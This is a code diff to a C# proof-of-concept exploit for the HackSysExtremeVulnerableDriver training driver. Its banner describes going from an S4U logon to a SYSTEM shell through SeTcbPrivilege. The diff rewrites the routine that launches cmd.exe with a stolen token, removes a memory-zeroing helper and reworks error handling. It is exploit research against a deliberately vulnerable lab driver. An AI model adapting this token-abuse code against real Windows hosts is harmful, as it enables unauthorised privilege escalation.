@@ -899,21 +899,17 @@ namespace TcbS4uAssignTokenVariant
         }
 
 
-        static bool CreateTokenAssignedProcess(
-            IntPtr hToken,
-            string command)
+        static bool CreateTokenAssignedShell(IntPtr hToken)
         {
-            int error;
-            var startupInfo = new STARTUPINFO();
-            startupInfo.cb = Marshal.SizeOf(startupInfo);
-            startupInfo.lpDesktop = "Winsta0\\Default";
-
-            Console.WriteLine("[>] Trying to create a token assigned process.\n");
-
-            if (!CreateProcessAsUser(
+            var startupInfo = new STARTUPINFO
+            {
+                cb = Marshal.SizeOf(typeof(STARTUPINFO)),
+                lpDesktop = @"Winsta0\Default"
+            };
+            bool status = CreateProcessAsUser(
                 hToken,
                 null,
-                command,
+                @"C:\Windows\System32\cmd.exe",
                 IntPtr.Zero,
                 IntPtr.Zero,
                 false,
@@ -921,20 +917,16 @@ namespace TcbS4uAssignTokenVariant
                 IntPtr.Zero,
                 Environment.CurrentDirectory,
                 ref startupInfo,
-                out PROCESS_INFORMATION processInformation))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to create new process.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
+                out PROCESS_INFORMATION processInformation);
 
-                return false;
+            if (status)
+            {
+                WaitForSingleObject(processInformation.hProcess, uint.MaxValue);
+                CloseHandle(processInformation.hThread);
+                CloseHandle(processInformation.hProcess);
             }
 
-            WaitForSingleObject(processInformation.hProcess, uint.MaxValue);
-            CloseHandle(processInformation.hThread);
-            CloseHandle(processInformation.hProcess);
-
-            return true;
+            return status;
         }
 
 
@@ -1051,7 +1043,6 @@ namespace TcbS4uAssignTokenVariant
             do
             {
                 infoBuffer = Marshal.AllocHGlobal(systemInformationLength);
-                ZeroMemory(infoBuffer, systemInformationLength);
 
                 ntstatus = NtQuerySystemInformation(
                     SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation,
@@ -1254,13 +1245,6 @@ namespace TcbS4uAssignTokenVariant
         }
 
 
-        static void ZeroMemory(IntPtr buffer, int size)
-        {
-            var nullBytes = new byte[size];
-            Marshal.Copy(nullBytes, 0, buffer, size);
-        }
-
-
         static void Main()
         {
             Console.WriteLine("--[ HEVD Kernel Write PoC : SeTcbPrivilege - From S4U Logon to SYSTEM Shell\n");
@@ -1337,8 +1321,15 @@ namespace TcbS4uAssignTokenVariant
                     break;
                 }
 
-                CreateTokenAssignedProcess(hS4uPrimaryToken, "C:\\Windows\\System32\\cmd.exe");
+                Console.WriteLine("[>] Trying to create a token assigned process.");
+                status = CreateTokenAssignedShell(hS4uPrimaryToken);
                 CloseHandle(hS4uPrimaryToken);
+
+                if (!status)
+                {
+                    Console.WriteLine("[-] Failed to get token assinged shell.");
+                    Console.WriteLine("    |-> {0}", GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+                }
             } while (false);
         }
     }
